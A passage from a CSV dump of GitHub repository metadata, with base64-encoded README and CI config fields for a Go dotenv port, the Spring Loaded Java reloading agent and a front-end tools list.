name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
cy9kb3RlbnYpIHdhcyB3cml0dGVuIGJ5IFtCcmFuZG9uIEtlZXBlcnNdKGh0
dHA6Ly9vcGVuc291bC5vcmcvKSwgYW5kIHRoaXMgcG9ydCB3YXMgZG9uZSBi
eSBbSm9obiBCYXJ0b25dKGh0dHBzOi8vam9obmJhcnRvbi5jby8pIGJhc2Vk
IG9mZiB0aGUgdGVzdHMvZml4dHVyZXMgaW4gdGhlIG9yaWdpbmFsIGxpYnJh
cnkuCg==
",,"bGFuZ3VhZ2U6IGdvCgpnbzoKICAtIDEueAoKb3M6CiAgLSBsaW51eAogIC0g
b3N4Cg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'spring-loaded',7044667,b'Java agent that enables class reloading in a running JVM',b'Java',126,2386,,2386,False,b'https://api.github.com/repos/spring-projects/spring-loaded/forks',"IyBXZWxjb21lIHRvIFNwcmluZy1Mb2FkZWQKCiMjIFdoYXQgaXMgU3ByaW5n
IExvYWRlZD8KClNwcmluZyBMb2FkZWQgaXMgYSBKVk0gYWdlbnQgZm9yIHJl
bG9hZGluZyBjbGFzcyBmaWxlIGNoYW5nZXMgd2hpbHN0IGEgSlZNIGlzIHJ1
bm5pbmcuICBJdCB0cmFuc2Zvcm1zCmNsYXNzZXMgYXQgbG9hZHRpbWUgdG8g
bWFrZSB0aGVtIGFtZW5hYmxlIHRvIGxhdGVyIHJlbG9hZGluZy4gVW5saWtl
ICdob3QgY29kZSByZXBsYWNlJyB3aGljaCBvbmx5IGFsbG93cwpzaW1wbGUg
Y2hhbmdlcyBvbmNlIGEgSlZNIGlzIHJ1bm5pbmcgKGUuZy4gY2hhbmdlcyB0
byBtZXRob2QgYm9kaWVzKSwgU3ByaW5nIExvYWRlZCBhbGxvd3MgeW91CnRv
IGFkZC9tb2RpZnkvZGVsZXRlIG1ldGhvZHMvZmllbGRzL2NvbnN0cnVjdG9y
cy4gVGhlIGFubm90YXRpb25zIG9uIHR5cGVzL21ldGhvZHMvZmllbGRzL2Nv
bnN0cnVjdG9ycwpjYW4gYWxzbyBiZSBtb2RpZmllZCBhbmQgaXQgaXMgcG9z
c2libGUgdG8gYWRkL3JlbW92ZS9jaGFuZ2UgdmFsdWVzIGluIGVudW0gdHlw
ZXMuCgpTcHJpbmcgTG9hZGVkIGlzIHVzYWJsZSBvbiBhbnkgYnl0ZWNvZGUg
dGhhdCBtYXkgcnVuIG9uIGEgSlZNLCBhbmQgaXMgYWN0dWFsbHkgdGhlIHJl
bG9hZGluZyBzeXN0ZW0KdXNlZCBpbiBHcmFpbHMgMi4KCiMgSW5zdGFsbGF0
aW9uCgoxLjIuNSBoYXMgbm93IGJlZW4gcmVsZWFzZWQ6IFtzcHJpbmdsb2Fk
ZWQtMS4yLjUuUkVMRUFTRS5qYXJdKGh0dHBzOi8vcmVwby5zcHJpbmcuaW8v
cmVsZWFzZS9vcmcvc3ByaW5nZnJhbWV3b3JrL3NwcmluZ2xvYWRlZC8xLjIu
NS5SRUxFQVNFL3NwcmluZ2xvYWRlZC0xLjIuNS5SRUxFQVNFLmphcikKCjEu
Mi42IHNuYXBzaG90cyBhcmUgaW4gdGhpcyByZXBvIGFyZWEgKGdyYWIgdGhl
IG1vc3QgcmVjZW50bHkgYnVpbHQgLmphcik6CjxhIGhyZWY9Imh0dHBzOi8v
cmVwby5zcHJpbmcuaW8vd2ViYXBwLyMvYXJ0aWZhY3RzL2Jyb3dzZS90cmVl
L0dlbmVyYWwvbGlicy1zbmFwc2hvdC1sb2NhbC9vcmcvc3ByaW5nZnJhbWV3
b3JrL3NwcmluZ2xvYWRlZC8xLjIuNi5CVUlMRC1TTkFQU0hPVCI+cmVwby5z
cHJpbmcuaW88L2E+CgpUaGUgZG93bmxvYWQgaXMgdGhlIGFnZW50IGphciBh
bmQgbmVlZHMgbm8gZnVydGhlciB1bnBhY2tpbmcgYmVmb3JlIHVzZS4KCgoj
IFJ1bm5pbmcgd2l0aCByZWxvYWRpbmcKCglqYXZhIC1qYXZhYWdlbnQ6PHBh
dGhUbz4vc3ByaW5nbG9hZGVkLXtWRVJTSU9OfS5qYXIgLW5vdmVyaWZ5IFNv
bWVKYXZhQ2xhc3MKClRoZSB2ZXJpZmllciBpcyBiZWluZyB0dXJuZWQgb2Zm
IGJlY2F1c2Ugc29tZSBvZiB0aGUgYnl0ZWNvZGUgcmV3cml0aW5nIHN0cmV0
Y2hlcyB0aGUgbWVhbmluZyBvZgpzb21lIG9mIHRoZSBieXRlY29kZXMgLSBp
biB3YXlzIHRoZSBKVk0gZG9lc24ndCBtaW5kIGJ1dCB0aGUgdmVyaWZpZXIg
ZG9lc24ndCBsaWtlLiAgT25jZSB1cCBhbmQKcnVubmluZyB3aGF0IGVmZmVj
dGl2ZWx5IGhhcHBlbnMgaXMgdGhhdCBhbnkgY2xhc3NlcyBsb2FkZWQgZnJv
bSBqYXIgZmlsZXMgKGRlcGVuZGVuY2llcykgYXJlIG5vdAp0cmVhdGVkIGFz
IHJlbG9hZGFibGUsIHdoaWxzdCBhbnl0aGluZyBsb2FkZWQgZnJvbSAuY2xh
c3MgZmlsZXMgb24gZGlzayBpcyBtYWRlIHJlbG9hZGFibGUuIE9uY2UKbG9h
ZGVkIHRoZSAuY2xhc3MgZmlsZSB3aWxsIGJlIHdhdGNoZWQgKG9uY2UgYSBz
ZWNvbmQpIGFuZCBzaG91bGQgYSBuZXcgdmVyc2lvbiBhcHBlYXIKU3ByaW5n
TG9hZGVkIHdpbGwgcGljayBpdCB1cC4gQW55IGxpdmUgaW5zdGFuY2VzIG9m
IHRoYXQgY2xhc3Mgd2lsbCBpbW1lZGlhdGVseSBzZWUgdGhlIG5ldyBmb3Jt
Cm9mIHRoZSBvYmplY3QsIHRoZSBpbnN0YW5jZXMgZG8gbm90IG5lZWQgdG8g
YmUgZGlzY2FyZGVkIGFuZCByZWNyZWF0ZWQuCgpObyBkb3VidCB0aGF0IHJh
aXNlcyBhIGxvdCBvZiBxdWVzdGlvbnMgYW5kIGhvcGVmdWxseSBhIHByb3Bl
ciBGQVEgd2lsbCBhcHBlYXIgaGVyZSBzaG9ydGx5ISBCdXQgaW4KdGhlIG1l
YW50aW1lLCBoZXJlIGFyZSBzb21lIGJhc2ljIFFzIGFuZCBBczoKClEuIERv
ZXMgaXQgcmVsb2FkIGFueXRoaW5nIHRoYXQgbWlnaHQgY2hhbmdlIGluIGEg
Y2xhc3MgZmlsZT8KQS4gTm8sIHlvdSBjYW4ndCBjaGFuZ2UgdGhlIGhpZXJh
cmNoeSBvZiBhIHR5cGUuIEFsc28gdGhlcmUgYXJlIGNlcnRhaW4gY29uc3Ry
dWN0b3IgcGF0dGVybnMgb2YKdXNhZ2UgaXQgY2FuJ3QgYWN0dWFsbHkgaGFu
ZGxlIHJpZ2h0IG5vdy4KClEuIFdpdGggb2JqZWN0cyBjaGFuZ2luZyBzaGFw
ZSwgd2hhdCBoYXBwZW5zIHdpdGggcmVzcGVjdCB0byByZWZsZWN0aW9uPwpB
LiBSZWZsZWN0aW9uIHJlc3VsdHMgY2hhbmdlIG92ZXIgdGltZSBhcyB0aGUg
b2JqZWN0cyBhcmUgcmVsb2FkZWQuICBGb3IgZXhhbXBsZSwgbW9kaWZ5aW5n
IGEgY2xhc3MKd2l0aCBhIG5ldyBtZXRob2QgYW5kIGNhbGxpbmcgYGdldERl
Y2xhcmVkTWV0aG9kcygpYCBhZnRlciByZWxvYWRpbmcgaGFzIG9jY3VycmVk
IHdpbGwgbWVhbiB5b3Ugc2VlCnRoZSBuZXcgbWV0aG9kIGluIHRoZSByZXN1
bHRzLiAqQnV0KiB0aGlzIGRvZXMgbWVhbiBpZiB5b3UgaGF2ZSBleGlzdGlu
ZyBjYWNoZXMgaW4geW91ciBzeXN0ZW0KdGhhdCBzdGFzaCByZWZsZWN0aXZl
IGluZm9ybWF0aW9uIGFzc3VtaW5nIGl0IG5ldmVyIGNoYW5nZXMsIHRob3Nl
IHdpbGwgbmVlZCB0byBiZSBjbGVhcmVkCmFmdGVyIGEgcmVsb2FkLgoKUS4g
SG93IGRvIEkga25vdyB3aGVuIGEgcmVsb2FkIGhhcyBvY2N1cnJlZCBzbyBJ
IGNhbiBjbGVhciBteSBzdGF0ZT8KQS4gWW91IGNhbiB3cml0ZSBhIHBsdWdp
biB0aGF0IGlzIGNhbGxlZCB3aGVuIHJlbG9hZHMgb2NjdXIgYW5kIHlvdSBj
YW4gdGhlbiB0YWtlIHRoZSBhcHByb3ByaWF0ZQphY3Rpb24uICBDcmVhdGUg
YW4gaW1wbGVtZW50YXRpb24gb2YgYFJlbG9hZEV2ZW50UHJvY2Vzc29yUGx1
Z2luYCBhbmQgdGhlbiByZWdpc3RlciBpdCB2aWEKYFNwcmluZ0xvYWRlZFBy
ZVByb2Nlc3Nvci5yZWdpc3Rlckdsb2JhbFBsdWdpbihwbHVnaW4pYC4gKFRo
ZXJlIGFyZSBvdGhlciB3YXlzIHRvIHJlZ2lzdGVyIHBsdWdpbnMsCndoaWNo
IHdpbGwgaG9wZWZ1bGx5IGdldCBzb21lIGRvY3VtZW50YXRpb24hKQoKUS4g
V2hhdCdzIHRoZSBzdGF0ZSBvZiB0aGUgY29kZWJhc2U/CkEuIFRoZSB0ZWNo
bm9sb2d5IGlzIHN1Y2Nlc3NmdWxseSBiZWluZyB1c2VkIGJ5IEdyYWlscyBm
b3IgcmVsb2FkaW5nLiBJdCBkb2VzIG5lZWQgc29tZSBwZXJmb3JtYW5jZQp3
b3JrIGFuZCBhIGZldyBzbWFja3Mgd2l0aCBhIHJlZmFjdG9yaW5nIGhhbW1l
ci4gSXQgbmVlZHMgdXBncmFkaW5nIGhlcmUgYW5kIHRoZXJlIHRvIHRvbGVy
YXRlCnRoZSBpbnZva2VkeW5hbWljIGluc3RydWN0aW9uIGFuZCBhc3NvY2lh
dGVkIG5ldyBjb25zdGFudCBwb29sIGVudHJpZXMgdGhhdCBhcnJpdmVkIGlu
IEphdmEgNy4KCiMgV29ya2luZyB3aXRoIHRoZSBjb2RlCgoJZ2l0IGNsb25l
IGh0dHBzOi8vZ2l0aHViLmNvbS9zcHJpbmctcHJvamVjdHMvc3ByaW5nLWxv
YWRlZAoKT25jZSBjbG9uZWQgdGhlcmUgd2lsbCBiZSBzb21lIHByb2plY3Rz
IHN1aXRhYmxlIGZvciBpbXBvcnQgaW50byBlY2xpcHNlLiBUaGUgbWFpbiBw
cm9qZWN0IGFuZApzb21lIHRlc3QgcHJvamVjdHMuIE9uZSBvZiB0aGUgdGVz
dCBwcm9qZWN0cyBpcyBhbiBBc3BlY3RKIHByb2plY3QgKGNvbnRhaW5pbmcg
Ym90aCBKYXZhCmFuZCBBc3BlY3RKIGNvZGUpLCBhbmQgb25lIGlzIGEgR3Jv
b3Z5IHByb2plY3QuIFRvIGNvbXBpbGUgdGhlc2UgdGVzdCBwcm9qZWN0cwpp
biBFY2xpcHNlIHlvdSB3aWxsIG5lZWQgdGhlIHJlbGV2YW50IGVjbGlwc2Ug
cGx1Z2luczoKCkFKRFQ6IHVwZGF0ZSBzaXRlOiBgaHR0cHM6Ly9kb3dubG9h
ZC5lY2xpcHNlLm9yZy90b29scy9hamR0LzQyL2Rldi91cGRhdGVgCkdyb292
eS1FY2xpcHNlOiB1cGRhdGUgc2l0ZTogYGh0dHBzOi8vZGlzdC5zcHJpbmdz
b3VyY2Uub3JnL3NuYXBzaG90L0dSRUNMSVBTRS9lNC4yL2AKCkFmdGVyIGlt
cG9ydGluZyB0aGVtIHlvdSBjYW4gcnVuIHRoZSB0ZXN0cy4gIFRoZXJlIGFy
ZSB0d28ga2luZHMgb2YgdGVzdHMsIGhhbmQgY3JhZnRlZCBhbmQKZ2VuZXJh
dGVkLiAgUnVubmluZyBhbGwgdGhlIHRlc3RzIGluY2x1ZGluZyB0aGUgZ2Vu
ZXJhdGVkIG9uZXMgY2FuIHRha2UgYSB3aGlsZS4KVG8gcnVuIGp1c3QgdGhl
IGhhbmQgY3JhZnRlZCBvbmVzIHN1cHBseSB0aGlzIHRvIHRoZSBKVk0gd2hl
biBsYXVuY2hpbmcgdGhlIHRlc3RzOgoKICAgIC1Ec3ByaW5nbG9hZGVkLnRl
c3RzLmdlbmVyYXRlZFRlc3RzPWZhbHNlCgpOT1RFOiBXaGVuIHJ1bm5pbmcg
dGhlIHRlc3RzIHlvdSBuZWVkIHRvIHBhc3MgYC1ub3ZlcmlmeWAgdG8gdGhl
IEpWTSBhbHNvLgoKVHdvIGxhdW5jaCBjb25maWd1cmF0aW9ucyBhcmUgYWxy
ZWFkeSBpbmNsdWRlZCBpZiB5b3UgYXJlIGltcG9ydGluZyB0aGVzZSBwcm9q
ZWN0cyBpbnRvIGVjbGlwc2UsCndoaWNoIHJ1biB3aXRoIG9yIHdpdGhvdXQg
dGhlIGdlbmVyYXRlZCB0ZXN0cy4KCkEgZ3JhZGxlIGJ1aWxkIHNjcmlwdCBp
cyBpbmNsdWRlZCwgcnVuICcuL2dyYWRsZXcgYnVpbGQnIHRvIHJlYnVpbGQg
dGhlIGFnZW50IC0gaXQgd2lsbCBiZSBjcmVhdGVkCmFzIHNvbWV0aGluZyBs
aWtlOiBgc3ByaW5nbG9hZGVkL2J1aWxkL2xpYnMvc3ByaW5nbG9hZGVkLTEu
MS41LkJVSUxELVNOQVBTSE9ULmphcmAKCiMgQ2FuIEkgY29udHJpYnV0ZT8K
ClN1cmUhIEp1c3QgcHJlc3MgKkZvcmsqIGF0IHRoZSB0b3Agb2YgdGhpcyBn
aXRodWIgcGFnZSBhbmQgZ2V0IGNvZGluZy4gQmVmb3JlIHdlIGFjY2VwdCBw
dWxsCnJlcXVlc3RzIHdlIGp1c3QgbmVlZCB5b3UgdG8gc2lnbiBhIHNpbXBs
ZSBjb250cmlidXRvcidzIGFncmVlbWVudCAtIHdoaWNoIHlvdSBjYW4gZmlu
ZApbaGVyZV0oaHR0cHM6Ly9zdXBwb3J0LnNwcmluZ3NvdXJjZS5jb20vc3By
aW5nX2NvbW1pdHRlcl9zaWdudXApLiBTaWduaW5nIHRoZSBjb250cmlidXRv
cidzCmFncmVlbWVudCBkb2VzIG5vdCBncmFudCBhbnlvbmUgY29tbWl0IHJp
Z2h0cyB0byB0aGUgbWFpbiByZXBvc2l0b3J5LCBidXQgaXQgZG9lcyBtZWFu
IHRoYXQgd2UKY2FuIGFjY2VwdCB5b3VyIGNvbnRyaWJ1dGlvbnMsIGFuZCB5
b3Ugd2lsbCBnZXQgYW4gYXV0aG9yIGNyZWRpdCBpZiB3ZSBkby4gQWN0aXZl
IGNvbnRyaWJ1dG9ycwptaWdodCBiZSBhc2tlZCB0byBqb2luIHRoZSBjb3Jl
IHRlYW0sIGFuZCBnaXZlbiB0aGUgYWJpbGl0eSB0byBtZXJnZSBwdWxsIHJl
cXVlc3RzLgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'frontend-tools',6002602,b'Landscaping With Front-end Tools',,15,2386,,2386,False,b'https://api.github.com/repos/codylindley/frontend-tools/forks',"CgoKCioqKgoKIyMgVEhJUyBJUyBERVBSRUlDQVRFRCBDT05URU5UCiMgVGhp
cyBjb250ZW50IGhhcyBldm9sdmVkIGludG8gYSBib29rIGNhbGxlZCAiRnJv
bnQtZW5kIEhhbmRib29rIjogaHR0cHM6Ly93d3cuZ2l0Ym9vay5jb20vYm9v
ay9mcm9udGVuZG1hc3RlcnMvZnJvbnQtZW5kLWhhbmRib29rL2RldGFpbHMK
CioqKgoKCgoKCgoKCgoKI0xhbmRzY2FwaW5nIFdpdGggRnJvbnRlbmQgRGV2
ZWxvcG1lbnQgVG9vbHMKCgpBbiBvcGluaW9uYXRlZCBsaXN0IG9mIHRvb2xz
IGZvciBmcm9udGVuZCAoaS5lLiBodG1sLCBqcywgY3NzKSBkZXNrdG9wL2xh
cHRvcCAoaS5lLiBkb2VzIG5vdCBpbmNsdWRlIHRhYmxldCBvciBwaG9uZSB5
ZXQpIHdlYiBkZXZlbG9wbWVudAoKCiMjQ29kaW5nIFRvb2xzCgoKIyMjIyMj
V29ya2Zsb3cvQnVpbGRzL0Fzc2VtYmxlcnMvVGFzay1ydW5uZXJzL0RldiBP
cHRzCgoqIFtidWRdKGh0dHA6Ly9naXRodWIuY29tL2F6ZXIvYnVkKQoqIFts
dW1iYXJdKGh0dHA6Ly93YWxtYXJ0bGFicy5naXRodWIuaW8vbHVtYmFyLykK
KiBbYnJ1bmNoXShodHRwOi8vYnJ1bmNoLmlvLykKKiBbZ3J1bnRdKGh0dHA6
Ly9ncnVudGpzLmNvbS8pCgkqIFtsaW5lbWFuXShodHRwczovL2dpdGh1Yi5j
b20vdGVzdGRvdWJsZS9saW5lbWFuKQoJKiBbeWVvbWFuXShodHRwOi8veWVv
bWFuLmlvLykKCSogW1Rha2VvZmZdKGh0dHA6Ly90c3ZlbnNlbi5naXRodWIu
aW8vVGFrZW9mZi8pCiogW2d1bHBqc10oaHR0cDovL2d1bHBqcy5jb20vKQoq
IFticm9jY29saV0oaHR0cHM6Ly9naXRodWIuY29tL2pvbGlzcy9icm9jY29s
aSkKKiBbbWltb3NhXShodHRwOi8vbWltb3NhLmlvLykKKiBbY29kZUtpdF0o
aHR0cDovL2luY2lkZW50NTcuY29tL2NvZGVraXQvKQoqIFtsaXZlUmVsb2Fk
XShodHRwOi8vbGl2ZXJlbG9hZC5jb20vKQoqIFtzdGVhbEpTXShodHRwOi8v
amF2YXNjcmlwdG12Yy5jb20vZG9jcy5odG1sIyFzdGVhbGpzKQoqIFthbnZp
bC5qc10oaHR0cHM6Ly9naXRodWIuY29tL2FudmlsanMvYW52aWwuanMvKQoq
IFttb2Rqc10oaHR0cDovL21vZHVsZWpzLmdpdGh1Yi5pby9tb2Rqcy8pCiog
W25vZGVmcm9udF0oaHR0cDovL2thcnRoaWt2LmdpdGh1Yi5jb20vbm9kZWZy
b250LykKKiBbQVVUT01BVE9OXShodHRwOi8vaW5kaWdvdW5pdGVkLmNvbS9h
dXRvbWF0b24vKQoqIFt2b2xvXShodHRwOi8vdm9sb2pzLm9yZy8pCiogW3Jv
b3RzXShodHRwOi8vcm9vdHMuY3gvKQoqIFttaWRkbGVtYW5dKGh0dHA6Ly9t
aWRkbGVtYW5hcHAuY29tLykKKiBbZmItZmxvXShodHRwOi8vZmFjZWJvb2su
Z2l0aHViLmlvL2ZiLWZsby8pCgotLS0KCiMjIyMjI0Jyb3dzZXIgUGFja2Fn
ZSBNYW5hZ2VycyAoY2hlY2tvdXQ6IFtGcm9udC1FbmQgUGFja2FnZSBNYW5h
Z2VyIENvbXBhcmlzb25dKGh0dHBzOi8vZ2l0aHViLmNvbS93aWxtb29yZS9m
cm9udGVuZC1wYWNrYWdlcnMpKQoKKiBbYm93ZXJdKGh0dHA6Ly9ib3dlci5p
bykKKiBbY29tcG9uZW50XShodHRwczovL2dpdGh1Yi5jb20vY29tcG9uZW50
L2NvbXBvbmVudCkKKiBbZW5kZXJdKGh0dHA6Ly9lbmRlci5qaXQuc3UvKQoq
IFtqYW1dKGh0dHA6Ly9qYW1qcy5vcmcvKQoqIFt2b2xvXShodHRwOi8vdm9s
b2pzLm9yZy8pCiogW2pzcG0uaW9dKGh0dHA6Ly9qc3BtLmlvLykKCi0tLQoK
IyMjIyMjQ1NTIEJhc2UvQm9pbGVycGxhdGUKKiBbbm9ybWFsaXplLmNzc10o
aHR0cDovL25lY29sYXMuZ2l0aHViLmNvbS9ub3JtYWxpemUuY3NzLykKCi0t
LQoKIyMjIyMjQ1NTIEZyYW1ld29ya3MgKFtDb21wYXJpc29uXShodHRwOi8v
cmVzcG9uc2l2ZS52ZXJtaWxpb24uY29tL2NvbXBhcmUucGhwKSBvciBbRnJv
bnQtZW5kIENTUyBmcmFtZXdvcmtzXShodHRwOi8vdXNhYmxpY2EuZ2l0aHVi
LmNvbS9mcm9udC1lbmQtZnJhbWV3b3Jrcy9jb21wYXJlLmh0bWwpKQoKKiBb
Zm91bmRhdGlvbl0oaHR0cDovL2ZvdW5kYXRpb24uenVyYi5jb20vKQoqIFti
b290c3RyYXBdKGh0dHA6Ly90d2l0dGVyLmdpdGh1Yi5jb20vYm9vdHN0cmFw
LykKKiBbSFRNTCBLaWNrU3RhcnRdKGh0dHA6Ly93d3cuOTlsaW1lLmNvbS9l
bGVtZW50cy8pCiogW2t1YmVdKGh0dHA6Ly9pbXBlcmF2aS5jb20va3ViZS8p
CiogW3NrZWxldG9uXShodHRwOi8vd3d3LmdldHNrZWxldG9uLmNvbS8pCiog
W2Jhc2VsaW5lXShodHRwOi8vYmFzZWxpbmVjc3MuY29tLykKKiBbZ3VtYnld
KGh0dHA6Ly9ndW1ieWZyYW1ld29yay5jb20pCiogW0dyb3VuZHdvcmtdKGh0
dHA6Ly9ncm91bmR3b3JrLnNpZGVyZWVsLmNvbS8/dXJsPWhvbWUpCiogW3Rv
cGNvYXRdKGh0dHA6Ly90b3Bjb2F0LmlvLykKKiBbcHVyZWNzc10oaHR0cDov
L3B1cmVjc3MuaW8vKQoqIFt0dWt0dWtdKGh0dHA6Ly90dWt0dWsudGFwcXVv
LmNvbS8pCiogW01ldHJvIFVJIENTU10oaHR0cDovL21ldHJvdWkub3JnLnVh
LykKKiBbRmxhdCBVSSBLaXRdKGh0dHA6Ly9kZXNpZ25tb2RvLmdpdGh1Yi5p
by9GbGF0LVVJLykKKiBbd29ya2xlc3NdKGh0dHA6Ly93b3JrbGVzcy5pa3Jl
YXRpdi5jb20vKQoqIFs5OWxpbWVdKGh0dHA6Ly93d3cuOTlsaW1lLmNvbS8p
CiogW2lua10oaHR0cDovL2luay5zYXBvLnB0LykKKiBbU2VtYW50aWMgVUld
KGh0dHA6Ly9zZW1hbnRpYy11aS5jb20vKQoqIFt1aWtpdF0oaHR0cDovL3d3
dy5nZXR1aWtpdC5jb20pCiogW2Nhc2NhZGUtZnJhbWV3b3JrXShodHRwOi8v
d3d3LmNhc2NhZGUtZnJhbWV3b3JrLmNvbS8pCiogW21pbmZ3a10oaHR0cDov
L21pbmZ3ay5jb20vKQoqIFtsYXllcnNdKGh0dHA6Ly9laXNraXMubmV0L2xh
eWVycy8pCgotLS0KCiMjIyMjI0hUTUwgQmFzZS9Cb2lsZXJwbGF0ZQoKKiBb
SFRNTDUgQm9pbGVycGxhdGVdKGh0dHA6Ly9odG1sNWJvaWxlcnBsYXRlLmNv
bS8pCiogW1JvY2sgSGFtbWVyXShodHRwOi8vc3R1ZmZhbmRub25zZW5zZS5j
by51ay9wcm9qZWN0cy9yb2NrLWhhbW1lci8pCiogW2h0bWw1Ym9uZXNdKGh0
dHA6Ly9odG1sNWJvbmVzLmNvbS8pCiogW2RDb2Rlc10oaHR0cDovL3d3dy5k
Y29kZXMubmV0LzIvZG9jcy9pbmRleC5odG1sKQoKLS0tCgojIyMjIyNGcm9u
dGVuZCBIVE1ML0NTUy9KUyBCYXNlL0JvaWxlcnBsYXRlCgoqIFtIZWFkc3Rh
cnRdKGh0dHA6Ly93d3cuaGVhZHN0YXJ0LmlvLykKKiBbZ29vZ2xlIFdlYiBT
dGFydGVyIEtpdF0oaHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vd2Vi
L3N0YXJ0ZXIta2l0LykKCi0tLQoKIyMjIyMjRE9NIFNjcmlwdGluZyAoRllJ
IGRvam8sIHl1aSwgZXh0LCBxb294ZG9vIGFsbCBoYXZlIERPTSB0b29scykK
KiBbalF1ZXJ5XShodHRwOi8vanF1ZXJ5LmNvbS8pCgkqICBbalF1ZXJ5Kytd
KGh0dHA6Ly9qcXVlcnlwcC5jb20vKQoqIFt6ZXB0b10oaHR0cDovL3plcHRv
anMuY29tLykKKiBbdGlyZV0oaHR0cDovL3RpcmVqcy5jb20vKQoqIFttb29U
b29sc10oaHR0cDovL21vb3Rvb2xzLm5ldC8pCiogW0RPTUFzc2lzdGFudF0o
aHR0cDovL3d3dy5kb21hc3Npc3RhbnQuY29tLykKKiBbRW5kZXJzIFRoZSBK
ZWVzaF0oaHR0cHM6Ly9naXRodWIuY29tL2VuZGVyLWpzL2plZXNoKQogCSog
W2RvbVJlYWR5XShodHRwczovL2dpdGh1Yi5jb20vZGVkL2RvbXJlYWR5KQog
CSogW3F1ZXJ5XShodHRwczovL2dpdGh1Yi5jb20vZGVkL3F3ZXJ5KQoJKiBb
Ym9uem9dKGh0dHBzOi8vZ2l0aHViLmNvbS9kZWQvYm9uem8pCgkqIFtiZWFu
XShodHRwczovL2dpdGh1Yi5jb20vZmF0L2JlYW4pCiogW3J5ZV0oaHR0cDov
L3J5ZWpzLmNvbS8pCiogW2RvbV0oaHR0cHM6Ly9naXRodWIuY29tL2NvbXBv
bmVudC9kb20pCgotLS0KCiMjIyMjI0pTIEhlbHBlcnMKKiBbbG8tZGFzaF0o
aHR0cDovL2xvZGFzaC5jb20vKQoqIFtmbi5qc10oaHR0cDovL2VsaXBlcmVs
bWFuLmNvbS9mbi5qcy8pCiogW2xhenkuanNdKGh0dHA6Ly9kYW5pZWx0YW8u
Y29tL2xhenkuanMvKQoqIFtzdHJpbmcuanNdKGh0dHA6Ly9zdHJpbmdqcy5j
b20vKQoqIFtib2lsZXIuanNdKGh0dHA6Ly93d3cuYm9pbGVyanMuY29tLykK
KiBbdW5kZXJzY29yZV0oaHR0cDovL3VuZGVyc2NvcmVqcy5vcmcvKQoJKiBb
dW5kZXJzY29yZS5zdHJpbmddKGh0dHA6Ly9lcGVsaS5naXRodWIuaW8vdW5k
ZXJzY29yZS5zdHJpbmcvKQoqIFtzdWdhci5qc10oaHR0cDovL3N1Z2FyanMu
